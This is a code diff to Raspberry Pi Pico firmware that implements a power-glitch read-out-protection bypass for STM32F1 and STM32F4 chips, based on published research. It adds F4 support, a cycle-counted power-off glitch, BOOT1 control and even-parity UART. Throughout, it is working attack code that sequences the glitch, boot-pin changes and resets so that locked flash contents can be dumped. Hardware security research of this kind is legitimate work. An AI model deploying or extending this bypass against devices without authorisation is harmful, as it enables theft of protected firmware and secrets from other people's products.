@@ -1,18 +1,24 @@
 /*
- * STM32F1 RDP Bypass Integration for Raiden-Pico
+ * STM32 RDP Bypass Integration for Raiden-Pico
  *
- * Based on stm32f1-picopwner by Patrick Pedersen (CTXz)
+ * Supports STM32F1 and STM32F4 series
+ *
+ * Based on stm32f1-picopwner and stimpik by Patrick Pedersen (CTXz)
  * Original attack by Johannes Obermaier, Marc Schink and Kosma Moczek
  * Paper: https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
  *
  * Attack sequence:
  *   1. Set BOOT0 high, power on (boot from SRAM)
  *   2. [User loads exploit firmware via debug probe]
- *   3. Power off, wait for reset low, power on immediately
- *   4. Wait ~15ms for SRAM exploit stage 1 (sets up FPB)
- *   5. Set BOOT0 low, pulse reset (boot from flash with FPB redirect)
+ *   3. Power off, wait fixed cycle count, power on immediately
+ *   4. Wait ~10ms for SRAM exploit stage 1 (sets up FPB)
+ *   5. Set BOOT0 low, wait 1ms, pulse reset (boot from flash with FPB redirect)
  *   6. Wait for dump magic bytes
  *   7. Forward flash dump data
+ *
+ * Target connections (Pico side is always GP4/GP5 at 9600 baud):
+ *   STM32F1: Connect to PA9 (TX) / PA10 (RX) - USART1
+ *   STM32F4: Connect to PC10 (TX) / PC11 (RX) - USART4
  */
 
 #include "stm32_pwner.h"
@@ -26,6 +32,7 @@
 // Module state
 static stm32_state_t state = STM32_STATE_IDLE;
 static uint8_t boot0_pin = STM32_BOOT0_PIN;
+static uint8_t boot1_pin = STM32_BOOT1_PIN;
 static uint32_t bytes_received = 0;
 static bool initialized = false;
 
@@ -69,11 +76,35 @@ uint8_t stm32_pwner_get_boot0_pin(void) {
 }
 
 void stm32_pwner_set_boot0(bool high) {
-    if (!initialized) {
-        stm32_pwner_init();
+    // Only init BOOT0 GPIO, not full module (avoid UART conflict)
+    static bool boot0_gpio_initialized = false;
+    if (!boot0_gpio_initialized) {
+        gpio_init(boot0_pin);
+        gpio_set_dir(boot0_pin, GPIO_OUT);
+        boot0_gpio_initialized = true;
     }
     gpio_put(boot0_pin, high ? 1 : 0);
     uart_cli_printf("OK: BOOT0 = %s\r\n", high ? "HIGH" : "LOW");
+}
+
+void stm32_pwner_set_boot1_pin(uint8_t pin) {
+    boot1_pin = pin;
+    gpio_init(boot1_pin);
+    gpio_set_dir(boot1_pin, GPIO_OUT);
+    gpio_put(boot1_pin, 0);
+    uart_cli_printf("OK: BOOT1 pin set to GP%u\r\n", pin);
+}
+
+uint8_t stm32_pwner_get_boot1_pin(void) {
+    return boot1_pin;
+}
+
+void stm32_pwner_set_boot1(bool high) {
+    if (!initialized) {
+        stm32_pwner_init();
+    }
+    gpio_put(boot1_pin, high ? 1 : 0);
+    uart_cli_printf("OK: BOOT1 = %s\r\n", high ? "HIGH" : "LOW");
 }
 
 stm32_result_t stm32_pwner_attack(void) {
@@ -102,17 +133,18 @@ stm32_result_t stm32_pwner_attack(void) {
     uart_cli_send("  [3] Executing power glitch...\r\n");
     set_power(false);
 
-    // Wait for reset to go low (target losing power)
-    if (!wait_for_reset_low(1000)) {
-        uart_cli_send("ERROR: Reset did not go low (timeout)\r\n");
-        state = STM32_STATE_ERROR;
-        return STM32_ERR_TIMEOUT;
+    // Wait fixed cycle count (more reliable than monitoring reset pin)
+    // This timing depends on board capacitance - adjust STM32_POWEROFF_LOOPS if needed
+    volatile uint32_t count = 0;
+    while (count < STM32_POWEROFF_LOOPS) {
+        count++;
+        __asm volatile ("nop");
     }
 
     // Immediately restore power - this is the glitch!
     // SRAM contents survive briefly, debugger lock clears on power cycle
     set_power(true);
-    uart_cli_send("  [4] Power restored - SRAM exploit running\r\n");
+    uart_cli_printf("  [4] Power restored after %u cycles - SRAM exploit running\r\n", count);
 
     // Step 4: Wait for stage 1 exploit to set up FPB
     sleep_ms(STM32_STAGE1_DELAY_MS);
@@ -120,6 +152,7 @@ stm32_result_t stm32_pwner_attack(void) {
     // Step 5: Set BOOT0 low (flash boot mode) and reset
     set_boot0(false);
     uart_cli_send("  [5] BOOT0 = LOW (flash boot mode)\r\n");
+    sleep_ms(STM32_BOOT0_DELAY_MS);  // Brief delay before reset
 
     // Pulse reset
     set_reset_output(true);  // Assert reset (active low)
@@ -212,6 +245,11 @@ static void init_gpio(void) {
     gpio_set_dir(boot0_pin, GPIO_OUT);
     gpio_put(boot0_pin, 0);  // Default low (flash boot)
 
+    // Initialize BOOT1 pin
+    gpio_init(boot1_pin);
+    gpio_set_dir(boot1_pin, GPIO_OUT);
+    gpio_put(boot1_pin, 0);  // Default low (bootloader mode when BOOT0=1)
+
     // Power pin (GP10) - use existing target_uart infrastructure
     gpio_init(STM32_POWER_PIN);
     gpio_set_dir(STM32_POWER_PIN, GPIO_OUT);
@@ -225,10 +263,11 @@ static void init_gpio(void) {
 
 static void init_uart(void) {
     // Initialize UART1 for target communication at 9600 baud
+    // STM32 bootloader requires EVEN parity (8E1)
     uart_init(STM32_UART_ID, STM32_UART_BAUD);
     gpio_set_function(STM32_UART_TX_PIN, GPIO_FUNC_UART);
     gpio_set_function(STM32_UART_RX_PIN, GPIO_FUNC_UART);
-    uart_set_format(STM32_UART_ID, 8, 1, UART_PARITY_NONE);
+    uart_set_format(STM32_UART_ID, 8, 1, UART_PARITY_EVEN);
     uart_set_fifo_enabled(STM32_UART_ID, true);
 }
 
